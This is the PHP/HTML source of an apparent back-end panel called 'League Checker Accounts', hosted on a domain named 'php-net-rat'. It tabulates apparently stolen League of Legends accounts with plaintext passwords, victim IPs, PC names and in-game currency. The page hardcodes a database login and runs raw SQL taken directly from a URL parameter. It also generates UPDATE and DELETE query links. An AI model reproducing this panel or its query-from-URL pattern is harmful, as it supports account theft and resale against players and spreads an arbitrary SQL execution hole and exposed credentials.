<!DOCTYPE html>
<html lang="en" class="demo-3">
	<head>
		<meta charset="UTF-8" />
		<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"> 
		<meta name="viewport" content="width=device-width, initial-scale=1.0"> 
		<title>League Checker Accounts</title>
		<link rel="stylesheet" type="text/css" href="css/style.css" />
		<link href='http://fonts.googleapis.com/css?family=Hammersmith+One|Questrial' rel='stylesheet' type='text/css'>
		<script src="js/modernizr.custom.63321.js"></script>
		<link rel="stylesheet" href="css/style_table.css">
		<link rel="stylesheet" href="css/style_menu.css">
		<link rel="stylesheet" href="css/style_settings.css">
	</head>
	<body>
		<div class="container">
			<header>
				<h1><strong>League</strong> accounts</h1>
				<h2>v 1.0.0.0</h2><br>
				<section class="container">
					<nav>
					  <ul class="nav">
						<li><a href="http://php-net-rat.esy.es/users.php" title="Accounts">Accounts</a></li>
						<li><a href="http://php-net-rat.esy.es/profile/dumplist.php" title="Search">Dump</a></li>
						<li><a href="http://php-net-rat.esy.es/profile/select_region.php" title="Statistics">Statistics</a></li>
					  </ul>
					</nav>	
				</section>
			</header>
			<center>
			<section class="main">
				<table align="center" cellspacing=0>
					<th>ID</th>
					<th>Region</th>
					<th>Redeemed</th>
					<th>Username</th>
					<th>Password</th>
					<th>Verified</th>
					<th>Level</th>
					<th>RP</th>
					<th>IP</th>
					<th>Champions</th>
					<th>Skins</th>
					<th>Refunds</th>
					<th>Refund RP</th>
					<th>Added on</th>
					<th>Division</th>
					<th>PC Name</th>
					<th>Delete</th>
					<?php
						mysql_connect('127.0.0.1', 'u474826184_rp', 'vasilutza98') or die(mysql_error());
						mysql_select_db('u474826184_rp') or die(mysql_error());
						$query=mysql_query($_GET['query']) or die(mysql_error());
						while($res=mysql_fetch_array($query))
						{
							echo'<tr class="even">';
							echo'<td>'.$res['id'].'</td>';
							echo'<td>'.$res['region'].'</td>';
							echo'<td><a href="http://php-net-rat.esy.es/stat.php?query=UPDATE u474826184_rp.accounts SET `redeemed`=\'Yes\' WHERE username=\''.$res['username'].'\';"><font color="blue">'.$res['redeemed'].'</font></a></td>';
							echo'<td>'.$res['username'].'</td>';
							echo'<td>'.$res['password'].'</td>';
							echo'<td>'.$res['verified'].'</td>';
							echo'<td>'.$res['level'].'</td>';
							echo'<td>'.$res['rp'].'</td>';
							echo'<td>'.$res['ip'].'</td>';
							echo'<td>'.$res['champions'].'</td>';
							echo'<td>'.$res['skins'].'</td>';
							echo'<td>'.$res['refunds'].'</td>';
							echo'<td>'.$res['can_refund_rp'].'</td>';
							echo'<td>'.$res['date_added'].'</td>';
							echo'<td>'.$res['division'].'</td>';
							echo'<td><a href="http://php-net-rat.esy.es/profile/users.php?profile='.$res['lc_users_name'].'">'.$res['lc_users_name'].'</a></td>';
							echo'<td><a href="http://php-net-rat.esy.es/stat.php?query=delete from u474826184_rp.accounts where username=\''.$res['username'].'\';"><font color="red">DELETE</font></a></td>';
							
						}
					?>
				</table>
			
			</section>
			</center>
		</div>
		<!-- Start of StatCounter Code for Default Guide -->
 
	</body>
</html>